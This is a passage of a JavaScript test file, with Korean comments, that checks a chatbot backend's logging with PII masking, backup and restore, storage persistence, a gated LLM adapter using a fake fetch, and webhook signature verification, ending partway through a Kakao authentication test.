/**
 * 런타임 동작 테스트 — TypeScript 소스를 실제로 컴파일해 실행한다.
 * (기존 unit.test.mjs는 소스 텍스트 계약 검사. 이 파일은 "정말 그렇게 동작하는가"를 본다.)
 *
 * 대상: next/react에 의존하지 않는 순수 lib 모듈.
 * typescript 미설치 등 컴파일 불가 환경에서는 전체를 skip 한다(테스트가 거짓 실패하지 않도록).
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { compileLibs, importLib, tscPath } from './_compile.mjs';

const CAN_COMPILE = tscPath() !== null;
const opts = CAN_COMPILE ? {} : { skip: 'typescript 미설치 — npm ci 후 실행' };

/** console.log/error 를 가로채 출력된 줄을 모은다. */
function captureConsole(fn) {
  const out = [];
  const err = [];
  const ol = console.log;
  const oe = console.error;
  console.log = (...a) => out.push(a.join(' '));
  console.error = (...a) => err.push(a.join(' '));
  try {
    fn();
  } finally {
    console.log = ol;
    console.error = oe;
  }
  return { out, err };
}

/* ══════════ 구조화 로깅 (정상 경로) ══════════ */

test('요청 로그 1건에 요청ID·소요시간·상태가 담긴다', opts, async () => {
  const { startRequest } = await importLib('logger', ['monitoring']);
  delete process.env.LOG_SILENT;
  process.env.LOG_LEVEL = 'info';

  const { out, err } = captureConsole(() => {
    const rl = startRequest('/api/chat', 'POST', null);
    rl.end({ status: 200, source: 'kb', intent: 'hours' });
  });

  assert.equal(err.length, 0, '2xx는 error로 나가지 않아야 한다');
  assert.equal(out.length, 1, '요청당 정확히 1건이어야 한다');
  const e = JSON.parse(out[0]);
  assert.equal(e.event, 'request');
  assert.equal(e.level, 'info');
  assert.equal(e.route, '/api/chat');
  assert.equal(e.method, 'POST');
  assert.equal(e.status, 200);
  assert.equal(e.source, 'kb');
  assert.equal(typeof e.durationMs, 'number');
  assert.ok(e.durationMs >= 0);
  assert.match(e.requestId, /^[A-Za-z0-9._-]{8,64}$/);
  assert.match(e.ts, /^\d{4}-\d{2}-\d{2}T/);
});

test('상류가 준 요청ID를 이어받는다(분산 추적)', opts, async () => {
  const { startRequest, newRequestId } = await importLib('logger', ['monitoring']);
  assert.equal(startRequest('/api/chat', 'POST', 'abc-123-def-456').requestId, 'abc-123-def-456');
  // 형식이 어긋나면(짧음·공백·제어문자) 서버가 새로 만든다
  assert.notEqual(newRequestId('짧음'), '짧음');
  assert.notEqual(newRequestId('has space here'), 'has space here');
  assert.match(newRequestId(''), /^[A-Za-z0-9._-]{8,64}$/);
  assert.notEqual(newRequestId(null), newRequestId(null), '매번 다른 ID여야 한다');
});

test('세션 해시는 같은 세션에 일관되고 원문을 담지 않는다', opts, async () => {
  const { hashId } = await importLib('logger', ['monitoring']);
  const a = hashId('sess-01012345678');
  assert.equal(a, hashId('sess-01012345678'));
  assert.notEqual(a, hashId('sess-01087654321'));
  assert.equal(a.includes('01012345678'), false, '원문이 그대로 들어가면 안 된다');
  assert.match(a, /^[0-9a-f]{12}$/);
});

test('LOG_LEVEL 아래 레벨은 출력하지 않는다', opts, async () => {
  const { log, shouldLog } = await importLib('logger', ['monitoring']);
  assert.equal(shouldLog('debug', 'info'), false);
  assert.equal(shouldLog('error', 'info'), true);
  delete process.env.LOG_SILENT;
  process.env.LOG_LEVEL = 'warn';
  const { out, err } = captureConsole(() => log('info', 'skipped', { route: '/x' }));
  assert.equal(out.length + err.length, 0);
  process.env.LOG_LEVEL = 'info';
});

/* ══════════ 구조화 로깅 (실패 경로 · 개인정보 보호) ══════════ */

test('허용 목록 밖 필드는 기록되지 않고 이름만 남는다', opts, async () => {
  const { buildEntry } = await importLib('logger', ['monitoring']);
  const e = buildEntry('info', 'request', {
    route: '/api/chat',
    message: '제 번호는 010-1234-5678 입니다',
    contact: 'hong@example.com',
    sessionId: 'sess-raw-value',
    reply: '안녕하세요',
  });
  const json = JSON.stringify(e);
  assert.equal(e.message, undefined);
  assert.equal(e.contact, undefined);
  assert.equal(e.sessionId, undefined);
  assert.equal(/010-1234-5678|hong@example\.com|sess-raw-value|안녕하세요/.test(json), false, '개인정보·본문이 로그에 남았다');
  assert.deepEqual([...e.dropped].sort(), ['contact', 'message', 'reply', 'sessionId']);
});

test('허용 필드에 섞인 개인정보도 마스킹된다', opts, async () => {
  const { buildEntry } = await importLib('logger', ['monitoring']);
  const e = buildEntry('error', 'request', {
    status: 500,
    code: 'internal',
    error: '발송 실패: 010-9876-5432 / a.b@corp.co.kr / 900101-2345678',
  });
  assert.equal(/010-9876-5432|a\.b@corp\.co\.kr|900101-2345678/.test(e.error), false, '마스킹되지 않았다');
  assert.match(e.error, /01\*-\*\*\*\*-\*\*\*\*/);
});

test('객체·배열 값은 통째로 흘리지 않는다', opts, async () => {
  const { buildEntry } = await importLib('logger', ['monitoring']);
  const e = buildEntry('info', 'request', { route: { secret: '010-1111-2222' }, status: 200 });
  assert.equal(typeof e.route, 'undefined');
  assert.ok(e.dropped.includes('route'));
});

test('5xx는 error 레벨로, 4xx는 warn 레벨로 나간다', opts, async () => {
  const { startRequest } = await importLib('logger', ['monitoring']);
  delete process.env.LOG_SILENT;
  process.env.LOG_LEVEL = 'info';
  const r1 = captureConsole(() => startRequest('/api/chat', 'POST').end({ status: 500, code: 'internal' }));
  assert.equal(r1.out.length, 0);
  assert.equal(JSON.parse(r1.err[0]).level, 'error');
  const r2 = captureConsole(() => startRequest('/api/chat', 'POST').end({ status: 429, code: 'rate_limited' }));
  assert.equal(JSON.parse(r2.err[0]).level, 'warn');
  assert.equal(JSON.parse(r2.err[0]).code, 'rate_limited');
});

test('로깅 실패가 요청을 깨뜨리지 않는다', opts, async () => {
  const { log, startRequest } = await importLib('logger', ['monitoring']);
  delete process.env.LOG_SILENT;
  captureConsole(() => {
    assert.doesNotThrow(() => log('info', 'bad', null), 'fields가 null이어도 던지면 안 된다');
    const circular = {};
    circular.self = circular;
    assert.doesNotThrow(() => log('info', 'bad', circular));
    const rl = startRequest('/api/chat', 'POST');
    assert.doesNotThrow(() => rl.end({ status: 200 }));
    assert.doesNotThrow(() => rl.end({ status: 200 }));
  });
});

test('end()를 두 번 불러도 1건만 기록된다', opts, async () => {
  const { startRequest } = await importLib('logger', ['monitoring']);
  delete process.env.LOG_SILENT;
  process.env.LOG_LEVEL = 'info';
  const { out } = captureConsole(() => {
    const rl = startRequest('/api/chat', 'POST');
    rl.end({ status: 200 });
    rl.end({ status: 500 });
  });
  assert.equal(out.length, 1);
  assert.equal(JSON.parse(out[0]).status, 200);
});

/* ══════════ 백업·복구 리허설 (RUNBOOK.md 근거) ══════════ */

test('복구 리허설: 백업 스냅샷으로 관리 콘텐츠가 원상 복구된다', opts, async () => {
  process.env.ADMIN_PERSIST = 'false'; // 테스트가 로컬 파일을 건드리지 않게 한다
  const store = await importLib('adminStore', ['knowledge', 'normalize']);

  // 1) 운영 상태를 만든다
  store.upsertKB({ id: 'drill-1', category: '리허설', question: '복구 훈련용 항목', keywords: ['리허설'], answer: '복구 확인용 답변' });
  store.setRuleOverride('hours', { reply: '리허설 응답' });
  const before = store.exportSnapshot();
  const beforeCount = before.kb.length;
  assert.ok(before.kb.some((e) => e.id === 'drill-1'));
  assert.equal(before.version, 1);

  // 2) 장애를 흉내낸다 — 콘텐츠 유실
  store.importSnapshot({ version: 1, savedAt: new Date().toISOString(), kb: [], ruleOverrides: {}, customRules: [] });
  assert.equal(store.listKB().length, 0, '유실 상태를 만들지 못했다');

  // 3) 백업본으로 복구
  const restored = store.importSnapshot(before);
  assert.equal(restored.ok, true);
  assert.equal(restored.kb, beforeCount);
  assert.equal(store.listKB().length, beforeCount);
  assert.ok(store.listKB().some((e) => e.id === 'drill-1'), '복구 후 항목이 없다');
  assert.equal(store.getRuleOverride('hours')?.reply, '리허설 응답');
});

test('복구 실패 경로: 손상된 스냅샷은 거부하고 기존 데이터를 보존한다', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const store = await importLib('adminStore', ['knowledge', 'normalize']);
  const keep = store.listKB().length;

  for (const bad of [null, 'text', 42, {}, { kb: [], customRules: [] }, { kb: 'x', ruleOverrides: {}, customRules: [] }]) {
    const r = store.importSnapshot(bad);
    assert.equal(r.ok, false, `${JSON.stringify(bad)} 를 통과시키면 안 된다`);
    // 거절 문장은 코드 어휘 대신 다음에 할 일을 말한다(DS 29-3).
    assert.match(r.error, /백업 파일 형식이 아닙니다/);
  }
  assert.equal(store.listKB().length, keep, '거부된 복원이 기존 데이터를 건드리면 안 된다');
});

test('복구 시 무효 항목은 건너뛰고 유효 항목만 반영한다', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const store = await importLib('adminStore', ['knowledge', 'normalize']);
  const r = store.importSnapshot({
    version: 1,
    savedAt: new Date().toISOString(),
    kb: [
      { id: 'good-1', category: '일반', question: '정상 항목', keywords: ['정상'], answer: '정상 답변' },
      { id: '', question: '빈 ID', keywords: ['x'], answer: 'y' },
      { id: 'no-kw', question: '키워드 없음', keywords: [], answer: 'y' },
      null,
    ],
    ruleOverrides: {},
    customRules: [],
  });
  assert.equal(r.ok, true);
  assert.equal(r.kb, 1, '유효 항목 1건만 반영되어야 한다');
  assert.equal(store.listKB().length, 1);
});

/* ══════════ 저장소 어댑터 (영속화) ══════════ */

import { mkdtempSync, writeFileSync, existsSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import nodePath from 'node:path';

/** 테스트용 임시 저장 디렉터리로 storage를 초기화한다. */
async function freshStorage(env = {}) {
  const st = await importLib('storage', ['logger', 'monitoring']);
  const dir = mkdtempSync(nodePath.join(tmpdir(), 'cb-st-'));
  process.env.LOG_SILENT = 'true';
  delete process.env.ADMIN_PERSIST;
  delete process.env.ADMIN_PERSIST_FILE;
  delete process.env.PERSIST_PII;
  process.env.STORAGE_DIR = dir;
  for (const [k, v] of Object.entries(env)) process.env[k] = v;
  st.resetStorageState();
  st.setDriver('file');
  return { st, dir };
}

test('저장소 정상 경로: 파일 드라이버로 저장·복원되고 상태에 남는다', opts, async () => {
  const { st, dir } = await freshStorage();

  const saved = st.saveJson('admin', { version: 1, kb: [{ id: 'a' }] });
  assert.equal(saved.ok, true);
  assert.ok(saved.bytes > 0);
  assert.ok(existsSync(nodePath.join(dir, 'admin.json')), '파일이 만들어지지 않았다');

  const loaded = st.loadJson('admin');
  assert.equal(loaded.ok, true);
  assert.deepEqual(loaded.data.kb, [{ id: 'a' }]);

  const s = st.storageStatus();
  assert.equal(s.driver, 'file');
  const ns = s.namespaces.find((n) => n.ns === 'admin');
  assert.equal(ns.health, 'ok');
  assert.equal(ns.persisted, true);
  assert.equal(ns.lastError, null);
  assert.match(ns.lastSavedAt, /^\d{4}-\d{2}-\d{2}T/);
});

test('저장소 실패 경로: 쓸 수 없는 경로여도 throw하지 않고 오류를 상태에 남긴다', opts, async () => {
  const { st, dir } = await freshStorage();
  // 디렉터리가 되어야 할 자리에 파일을 둔다 → mkdir 시 ENOTDIR
  const blocker = nodePath.join(dir, 'blocked');
  writeFileSync(blocker, 'not a directory', 'utf8');
  process.env.STORAGE_DIR = nodePath.join(blocker, 'sub');

  let threw = false;
  let res;
  try {
    res = st.saveJson('admin', { version: 1 });
  } catch {
    threw = true;
  }
  assert.equal(threw, false, '저장 실패가 애플리케이션으로 새어나가면 안 된다');
  assert.equal(res.ok, false);
  assert.equal(res.reason, 'error');

  const ns = st.storageStatus().namespaces.find((n) => n.ns === 'admin');
  assert.equal(ns.health, 'error', '실패를 조용히 넘기면 안 된다');
  assert.equal(ns.persisted, false);
  assert.ok(ns.lastError && ns.lastError.length > 0, '실패 사유가 기록되어야 한다');
  assert.match(ns.lastErrorAt, /^\d{4}-\d{2}-\d{2}T/);
});

test('읽기전용 파일시스템은 오류가 아니라 readonly 상태로 구분한다', opts, async () => {
  const { st } = await freshStorage();
  st.setDriver({
    name: 'file',
    read: () => null,
    write: () => {
      const e = new Error('EROFS: read-only file system, open /var/task/data/admin.json');
      e.code = 'EROFS';
      throw e;
    },
    remove: () => {},
  });

  const res = st.saveJson('admin', { version: 1 });
  assert.equal(res.ok, false);
  assert.equal(res.reason, 'readonly', 'Vercel 등 읽기전용 환경은 장애 알림 대상이 아니다');
  const ns = st.storageStatus().namespaces.find((n) => n.ns === 'admin');
  assert.equal(ns.health, 'readonly');
  assert.ok(ns.lastError.includes('EROFS'));
  assert.equal(/\/var\/task/.test(ns.lastError), false, '오류 요약에 전체 경로가 남으면 안 된다');
});

test('손상된 저장 파일은 기본값으로 넘어가고 사유를 남긴다', opts, async () => {
  const { st, dir } = await freshStorage();
  writeFileSync(nodePath.join(dir, 'admin.json'), '{ 깨진 JSON', 'utf8');

  const r = st.loadJson('admin');
  assert.equal(r.ok, false);
  assert.equal(r.reason, 'error');
  const ns = st.storageStatus().namespaces.find((n) => n.ns === 'admin');
  assert.equal(ns.health, 'error');
  assert.ok(ns.lastError);
});

test('개인정보 네임스페이스는 승인 전까지 디스크에 쓰지 않는다', opts, async () => {
  const { st, dir } = await freshStorage();

  const blocked = st.saveJson('tickets', { version: 1, tickets: [{ contact: '010-1234-5678' }] });
  assert.equal(blocked.ok, false);
  assert.equal(blocked.reason, 'awaiting_approval');
  assert.equal(existsSync(nodePath.join(dir, 'tickets.json')), false, '승인 전 개인정보가 디스크에 남으면 안 된다');
  assert.equal(st.isPersistEnabled('tickets'), false);
  assert.equal(st.isPersistEnabled('audit'), true, '개인정보가 없는 감사 로그는 저장 대상이다');

  const ns = st.storageStatus().namespaces.find((n) => n.ns === 'tickets');
  assert.equal(ns.health, 'awaiting_approval');

  // 승인 후에는 같은 코드 경로로 저장된다
  process.env.PERSIST_PII = 'true';
  const approved = st.saveJson('tickets', { version: 1, tickets: [] });
  assert.equal(approved.ok, true);
  assert.ok(existsSync(nodePath.join(dir, 'tickets.json')));
  delete process.env.PERSIST_PII;
});

test('ADMIN_PERSIST=false 면 어떤 네임스페이스도 저장하지 않는다', opts, async () => {
  const { st, dir } = await freshStorage({ ADMIN_PERSIST: 'false' });
  const r = st.saveJson('admin', { version: 1 });
  assert.equal(r.ok, false);
  assert.equal(r.reason, 'disabled');
  assert.equal(existsSync(nodePath.join(dir, 'admin.json')), false);
  delete process.env.ADMIN_PERSIST;
});

test('flushSaves는 대기 중인 저장을 버리지 않고 즉시 기록한다', opts, async () => {
  const { st, dir } = await freshStorage();
  st.scheduleSave('admin', () => ({ version: 1, mark: 'flushed' }));
  assert.equal(existsSync(nodePath.join(dir, 'admin.json')), false, '디바운스 전에는 아직 쓰지 않는다');

  st.flushSaves();
  const raw = JSON.parse(readFileSync(nodePath.join(dir, 'admin.json'), 'utf8'));
  assert.equal(raw.mark, 'flushed', '대기 중이던 마지막 변경이 사라지면 안 된다');
});

test('관리 콘텐츠가 저장소를 거쳐 재기동 후에도 복원된다', opts, async () => {
  const { st, dir } = await freshStorage();
  const store = await importLib('adminStore', ['knowledge', 'normalize', 'storage', 'logger', 'monitoring']);

  store.upsertKB({ id: 'persist-1', category: '영속화', question: '저장되나요?', keywords: ['저장'], answer: '네, 저장됩니다.' });
  store.flushAdminPersist();

  const file = nodePath.join(dir, 'admin.json');
  assert.ok(existsSync(file), '관리 콘텐츠가 저장되지 않았다');
  const snap = JSON.parse(readFileSync(file, 'utf8'));
  assert.ok(snap.kb.some((e) => e.id === 'persist-1'));

  // 재기동을 흉내낸다 — 메모리를 비우고 저장분으로 복원
  store.importSnapshot({ version: 1, savedAt: new Date().toISOString(), kb: [], ruleOverrides: {}, customRules: [] }, { persist: false });
  assert.equal(store.listKB().length, 0);
  const loaded = st.loadJson('admin');
  assert.equal(loaded.ok, true);
  store.importSnapshot(loaded.data, { persist: false });
  assert.ok(store.listKB().some((e) => e.id === 'persist-1'), '재기동 복원이 되지 않았다');
});

/* ══════════ LLM 어댑터 ══════════ */

/** 호출 기록을 남기는 가짜 fetch. status/body/throw 를 시나리오로 준다. */
function fakeFetch(steps) {
  const calls = [];
  const queue = [...steps];
  const fn = async (url, init) => {
    calls.push({ url, init, body: init?.body ? JSON.parse(init.body) : null });
    const step = queue.length > 1 ? queue.shift() : queue[0];
    if (step.throws) {
      const e = new Error(step.throws === 'abort' ? 'aborted' : 'boom');
      if (step.throws === 'abort') e.name = 'AbortError';
      throw e;
    }
    return {
      ok: step.status >= 200 && step.status < 300,
      status: step.status,
      json: async () => step.json ?? {},
    };
  };
  fn.calls = calls;
  return fn;
}

function llmCfg(over = {}) {
  return {
    live: true,
    provider: 'anthropic',
    model: 'test-model',
    apiKey: 'sk-test',
    baseUrl: 'https://example.invalid',
    maxInputChars: 6000,
    maxOutputTokens: 200,
    timeoutMs: 500,
    retries: 1,
    maxCallsPerMinute: 60,
    ...over,
  };
}

const noSleep = async () => {};

test('LLM 게이트가 꺼져 있으면 네트워크 호출을 하지 않는다 [승인 필요 기본값]', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  llm.resetLLMState();
  const f = fakeFetch([{ status: 200 }]);
  const r = await llm.complete({ system: 's', messages: [{ role: 'user', content: '안녕' }] }, {
    config: llmCfg({ live: false }),
    fetchImpl: f,
    sleep: noSleep,
  });
  assert.equal(r.ok, false);
  assert.equal(r.reason, 'disabled');
  assert.equal(f.calls.length, 0, '게이트 OFF에서 외부 호출이 나가면 안 된다');
});

test('정상 경로 — 근거 자료로 답변을 생성하고 개인정보는 마스킹해 보낸다', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  llm.resetLLMState();
  const f = fakeFetch([{ status: 200, json: { content: [{ type: 'text', text: '영업시간은 09시~18시입니다.' }] } }]);

  const r = await llm.generateGroundedAnswer(
    {
      question: '제 번호는 010-1234-5678인데 영업시간 알려주세요',
      docs: [{ id: 'kb-1', question: '영업시간', answer: '평일 09시~18시' }],
    },
    { config: llmCfg(), fetchImpl: f, sleep: noSleep },
  );

  assert.equal(r.failed, undefined);
  assert.equal(r.text, '영업시간은 09시~18시입니다.');
  assert.equal(f.calls.length, 1);

  const sent = JSON.stringify(f.calls[0].body);
  assert.equal(sent.includes('010-1234-5678'), false, '전화번호 원문이 외부로 나가면 안 된다');
  assert.match(sent, /01\*-\*\*\*\*-\*\*\*\*/);
  assert.match(f.calls[0].body.system, /자료/, '근거 자료가 시스템 프롬프트에 담겨야 한다');
  assert.equal(f.calls[0].body.max_tokens, 200, '출력 토큰 상한이 적용되어야 한다');
  assert.equal(f.calls[0].init.headers['x-api-key'], 'sk-test');
});

test('실패 경로 — 5xx는 재시도하고, 끝내 실패하면 사유만 남기고 throw 하지 않는다', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  llm.resetLLMState();
  const f = fakeFetch([{ status: 503 }]);
  const r = await llm.complete({ system: 's', messages: [{ role: 'user', content: '질문' }] }, {
    config: llmCfg({ retries: 2 }),
    fetchImpl: f,
    sleep: noSleep,
  });
  assert.equal(r.ok, false);
  assert.equal(r.reason, 'upstream_error');
  assert.equal(r.attempts, 3, 'retries=2 → 총 3회 시도');
  assert.equal(f.calls.length, 3);
});

test('실패 경로 — 4xx는 재시도하지 않는다(무의미한 재호출 금지)', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  llm.resetLLMState();
  const f = fakeFetch([{ status: 400 }]);
  const r = await llm.complete({ system: 's', messages: [{ role: 'user', content: '질문' }] }, {
    config: llmCfg({ retries: 2 }),
    fetchImpl: f,
    sleep: noSleep,
  });
  assert.equal(r.ok, false);
  assert.equal(f.calls.length, 1);
});

test('실패 경로 — 타임아웃/네트워크 오류를 사유로 구분한다', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  llm.resetLLMState();
  const t = await llm.complete({ system: 's', messages: [{ role: 'user', content: 'q' }] }, {
    config: llmCfg({ retries: 0 }),
    fetchImpl: fakeFetch([{ throws: 'abort' }]),
    sleep: noSleep,
  });
  assert.equal(t.reason, 'timeout');

  llm.resetLLMState();
  const n = await llm.complete({ system: 's', messages: [{ role: 'user', content: 'q' }] }, {
    config: llmCfg({ retries: 0 }),
    fetchImpl: fakeFetch([{ throws: 'net' }]),
    sleep: noSleep,
  });
  assert.equal(n.reason, 'network');
});

test('키가 없으면 호출 없이 not_configured (시크릿 하드코딩 금지 전제)', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  llm.resetLLMState();
  const f = fakeFetch([{ status: 200 }]);
  const r = await llm.complete({ system: 's', messages: [{ role: 'user', content: 'q' }] }, {
    config: llmCfg({ apiKey: '' }),
    fetchImpl: f,
    sleep: noSleep,
  });
  assert.equal(r.reason, 'not_configured');
  assert.equal(f.calls.length, 0);
});

test('분당 호출 상한을 넘기면 비용이 새기 전에 막는다', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  llm.resetLLMState();
  const f = fakeFetch([{ status: 200, json: { content: [{ type: 'text', text: '답' }] } }]);
  const cfg = llmCfg({ maxCallsPerMinute: 2, retries: 0 });
  const run = () => llm.complete({ system: 's', messages: [{ role: 'user', content: 'q' }] }, { config: cfg, fetchImpl: f, sleep: noSleep });

  assert.equal((await run()).ok, true);
  assert.equal((await run()).ok, true);
  const third = await run();
  assert.equal(third.ok, false);
  assert.equal(third.reason, 'budget_exceeded');
  assert.equal(f.calls.length, 2, '상한 초과분은 호출 자체가 나가지 않아야 한다');
});

test('연속 실패가 쌓이면 서킷을 열어 장애 중인 업스트림을 두들기지 않는다', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  llm.resetLLMState();
  const f = fakeFetch([{ status: 500 }]);
  const cfg = llmCfg({ retries: 0 });
  for (let i = 0; i < llm.CIRCUIT_FAILURE_LIMIT; i += 1) {
    await llm.complete({ system: 's', messages: [{ role: 'user', content: 'q' }] }, { config: cfg, fetchImpl: f, sleep: noSleep });
  }
  const before = f.calls.length;
  const blocked = await llm.complete({ system: 's', messages: [{ role: 'user', content: 'q' }] }, { config: cfg, fetchImpl: f, sleep: noSleep });
  assert.equal(blocked.reason, 'circuit_open');
  assert.equal(f.calls.length, before, '서킷이 열린 동안 추가 호출이 나가면 안 된다');
  assert.equal(llm.llmState().circuitOpen, true);
  llm.resetLLMState();
});

test('입력 상한 — 오래된 턴부터 버리고 마지막 질문은 반드시 남긴다', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  const msgs = [
    { role: 'user', content: 'A'.repeat(400) },
    { role: 'assistant', content: 'B'.repeat(400) },
    { role: 'user', content: '마지막 질문' },
  ];
  const c = llm.clampMessages('시스템', msgs, 500);
  assert.ok(c.dropped > 0, '오래된 턴이 버려져야 한다');
  assert.equal(c.messages[c.messages.length - 1].content, '마지막 질문');
  assert.ok(c.chars <= 500);
  assert.ok(llm.estimateTokens('안녕하세요') > llm.estimateTokens('hello'), '한국어 토큰 추정이 더 커야 한다');
});

/* ══════════ 대화 엔진 × LLM 폴백 ══════════ */

// 대화 엔진 모듈들은 **한 번의 컴파일 결과를 공유**해야 상태(KB·세션)가 통한다.
// importLib의 캐시 키는 [이름, ...deps] 이므로, 자기 자신을 뺀 같은 집합을 넘겨 키를 일치시킨다.
const ENGINE = [
  'chat', 'adminStore', 'knowledge', 'rules', 'normalize', 'session',
  'escalation', 'handoff', 'llm', 'monitoring', 'storage', 'logger', 'convlog', 'slots', 'kst', 'pii',
];
const eng = (name) => importLib(name, ENGINE.filter((n) => n !== name));

/** 확신 매칭은 안 되지만 연관 제안(근거 자료)은 걸리는 질문을 만들어 LLM 경로를 태운다. */
async function seedLLMFixture() {
  process.env.ADMIN_PERSIST = 'false';
  const chat = await eng('chat');
  const store = await eng('adminStore');
  const session = await eng('session');
  const llm = await eng('llm');
  store.upsertKB({
    id: 'rt-llm-kb',
    category: '테스트',
    question: '핀번호 확인 방법',
    keywords: ['zzzzq'],
    answer: '마이페이지 > 내 정보에서 확인하실 수 있습니다.',
  });
  session.resetSessions();
  llm.resetLLMState();
  return { chat, store, session, llm, question: '핀번호' };
}

test('LLM 경로에 진입하려면 근거 자료(연관 FAQ)가 있어야 한다', opts, async () => {
  const { chat, question } = await seedLLMFixture();
  delete process.env.CHAT_LLM_LIVE;
  const base = chat.replyTo(question, 'rt-llm-base');
  assert.equal(base.source, 'fallback');
  assert.equal(base.suggestions?.length > 0, true, '연관 제안이 있어야 LLM에 줄 근거가 생긴다');
});

test('LLM이 실패해도 결정적 폴백 답변이 그대로 나간다(빈 화면 금지)', opts, async () => {
  const { chat, question } = await seedLLMFixture();
  process.env.CHAT_LLM_LIVE = 'true';
  try {
    const r = await chat.replyToAsync(question, 'rt-llm-fail', {
      config: llmCfg({ retries: 0 }),
      fetchImpl: fakeFetch([{ status: 500 }]),
      sleep: noSleep,
    });
    assert.equal(r.source, 'fallback', '실패했는데 생성 답변인 척하면 안 된다');
    assert.equal(r.llmFailure, 'upstream_error', '실패 사유가 로그용으로 남아야 한다');
    assert.ok(r.reply.length > 0, '사용자에게 보여줄 안내가 반드시 있어야 한다');
    assert.equal(r.reply.includes('undefined'), false);
    assert.match(r.reply, /상담원/, '막혔을 때 다음 행동을 제시해야 한다');
  } finally {
    delete process.env.CHAT_LLM_LIVE;
  }
});

test('LLM 성공 시 근거 자료를 넘기고 AI 생성 고지를 붙인다', opts, async () => {
  const { chat, question } = await seedLLMFixture();
  process.env.CHAT_LLM_LIVE = 'true';
  const f = fakeFetch([{ status: 200, json: { content: [{ type: 'text', text: '마이페이지에서 확인하실 수 있어요.' }] } }]);
  try {
    const r = await chat.replyToAsync(question, 'rt-llm-ok', {
      config: llmCfg({ retries: 0 }),
      fetchImpl: f,
      sleep: noSleep,
    });
    assert.equal(r.source, 'llm');
    assert.match(r.reply, /마이페이지에서 확인하실 수 있어요/);
    assert.match(r.reply, /AI가 등록된 자료를 근거로/, 'AI 생성 고지가 빠지면 안 된다');
    assert.equal(f.calls.length, 1);
    assert.match(f.calls[0].body.system, /핀번호 확인 방법/, '근거 자료가 프롬프트에 담겨야 한다');
  } finally {
    delete process.env.CHAT_LLM_LIVE;
  }
});

test('게이트가 꺼져 있으면 replyToAsync는 replyTo와 같은 답을 준다', opts, async () => {
  delete process.env.CHAT_LLM_LIVE;
  const chat = await eng('chat');
  const session = await eng('session');

  session.resetSessions();
  const sync = chat.replyTo('영업시간 알려주세요', 'rt-same-1');
  session.resetSessions();
  const asyncReply = await chat.replyToAsync('영업시간 알려주세요', 'rt-same-2');

  assert.equal(asyncReply.reply, sync.reply);
  assert.equal(asyncReply.source, sync.source);
});

/* ══════════ 웹훅 서명 검증 · 재시도 ══════════ */

test('정상 경로 — 올바른 서명은 통과한다', opts, async () => {
  const wa = await importLib('webhookAuth', []);
  const now = 1_700_000_000_000;
  const ts = String(Math.floor(now / 1000));
  const body = JSON.stringify({ userRequest: { utterance: '영업시간' } });
  const sig = wa.signPayload('secret-1', ts, body);

  assert.deepEqual(wa.verifySignature({ secret: 'secret-1', signature: sig, timestamp: ts, rawBody: body, nowMs: now }), { ok: true });
  assert.deepEqual(wa.verifySignature({ secret: 'secret-1', signature: `v1=${sig}`, timestamp: ts, rawBody: body, nowMs: now }), { ok: true });
});

test('실패 경로 — 본문 변조·시크릿 불일치·리플레이·누락을 각각 거절한다', opts, async () => {
  const wa = await importLib('webhookAuth', []);
  const now = 1_700_000_000_000;
  const ts = String(Math.floor(now / 1000));
  const body = JSON.stringify({ a: 1 });
  const sig = wa.signPayload('secret-1', ts, body);
  const base = { secret: 'secret-1', signature: sig, timestamp: ts, rawBody: body, nowMs: now };

  assert.equal(wa.verifySignature({ ...base, rawBody: JSON.stringify({ a: 2 }) }).reason, 'mismatch');
  assert.equal(wa.verifySignature({ ...base, secret: 'secret-2' }).reason, 'mismatch');
  assert.equal(wa.verifySignature({ ...base, nowMs: now + 10 * 60_000 }).reason, 'expired', '오래된 요청 재전송은 막아야 한다');
  assert.equal(wa.verifySignature({ ...base, signature: '' }).reason, 'missing_signature');
  assert.equal(wa.verifySignature({ ...base, timestamp: '' }).reason, 'missing_timestamp');
  assert.equal(wa.verifySignature({ ...base, timestamp: 'abc' }).reason, 'bad_timestamp');
  assert.equal(wa.verifySignature({ ...base, secret: '' }).reason, 'no_secret');
});

test('서명 비교는 값을 그대로 비교하지 않는다(상수 시간)', opts, async () => {
  const wa = await importLib('webhookAuth', []);
  assert.equal(wa.safeEqual('abc', 'abc'), true);
  assert.equal(wa.safeEqual('abc', 'abd'), false);
  assert.equal(wa.safeEqual('abc', 'abcdefghijk'), false, '길이가 달라도 예외 없이 false여야 한다');
  assert.equal(wa.safeEqual('', ''), true);
});

test('재시도(중복 전달)는 엔진을 다시 돌리지 않고 이전 응답을 돌려준다', opts, async () => {
  const wa = await importLib('webhookAuth', []);
  wa.resetDedupe();
  const now = 1_700_000_000_000;
  const key = wa.eventKey(['evt', 'delivery-1']);

  assert.equal(wa.dedupeCheck(key, { now }).duplicate, false, '첫 전달은 처리해야 한다');
  wa.dedupeRemember(key, { version: '2.0' }, { now });

  const again = wa.dedupeCheck(key, { now: now + 1000 });
  assert.equal(again.duplicate, true);
  assert.deepEqual(again.response, { version: '2.0' });

  // TTL이 지나면 다시 새 이벤트로 본다
  assert.equal(wa.dedupeCheck(key, { now: now + 120_000, ttlMs: 60_000 }).duplicate, false);
  wa.resetDedupe();
});

test('카카오 웹훅 인증 — 시크릿 미설정 시 정책(선택/필수)에 따라 갈린다', opts, async () => {
  const kakao = await importLib('kakao', ['webhookAuth']);
  const body = '{"userRequest":{"utterance":"안녕"}}';
  const h = (o = {}) => new Headers(o);

  assert.equal(kakao.authenticateKakao(h(), body, {}).ok, true, '미설정 + 선택 → 통과(현행 유지)');
  assert.equal(
    kakao.authenticateKakao(h(), body, { KAKAO_SIGNATURE_REQUIRED: 'true' }).reason,
    'no_secret',
    '필수인데 시크릿이 없으면 조용히 열지 말고 차단해야 한다',
  );
